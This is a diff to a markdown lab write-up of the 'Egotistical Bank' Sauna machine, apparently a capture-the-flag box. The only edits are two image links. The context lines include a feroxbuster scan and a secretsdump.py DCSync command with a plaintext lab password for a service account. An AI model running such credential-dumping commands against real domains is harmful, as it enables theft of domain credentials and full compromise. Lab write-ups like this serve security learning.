@@ -149,7 +149,7 @@ feroxbuster -u http://EGOTISTICAL-BANK.LOCAL// -C 404
 301      GET        2l       10w      159c http://egotistical-bank.local/Fonts => http://egotistical-bank.local/Fonts/
 ```
 ## Website functionality
-![[Pasted image 20260308214150.png|948]]
+![](Pasted%20image%2020260406002629.png)
 Found some users on the system
 
 ```python
@@ -348,7 +348,7 @@ Now looking at this user on bloodhound i have some interesting privileges
 
 # DCSync leads to full domain compromise
 The new user has GetChanges and GetChangesAll on the domain
-![[Pasted image 20260308223341.png]]
+![](Pasted%20image%2020260406002645.png)
 
 ```python
 secretsdump.py 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'sauna.egotistical-bank.local'
